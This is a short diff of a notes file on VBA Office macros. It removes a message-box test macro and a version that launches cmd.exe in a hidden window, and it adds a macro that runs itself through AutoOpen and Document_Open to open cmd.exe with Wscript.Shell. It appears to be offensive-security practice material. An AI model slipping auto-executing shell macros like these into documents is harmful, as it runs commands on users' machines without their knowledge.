@@ -1,27 +1,16 @@
-
-# Auto Open document
-
-Sub Document_Open()
-    MyMacro
-End Sub
-  Sub AutoOpen()
-    MyMacro
-    End Sub
-  Sub MyMacro()
-    MsgBox ("This is a macro test")
-End Sub
-
 # Open CMD
 
-Sub Document_Open()
-  MyMacro
-  End Sub
 Sub AutoOpen()
-  MyMacro
-  End Sub
-Sub MyMacro()
-  Dim str As String
-  str = "cmd.exe"
-  Shell str, vbHide
-  CreateObject("Wscript.Shell").Run str, 0
+    MyMacro
 End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    Str = "cmd.exe"
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+
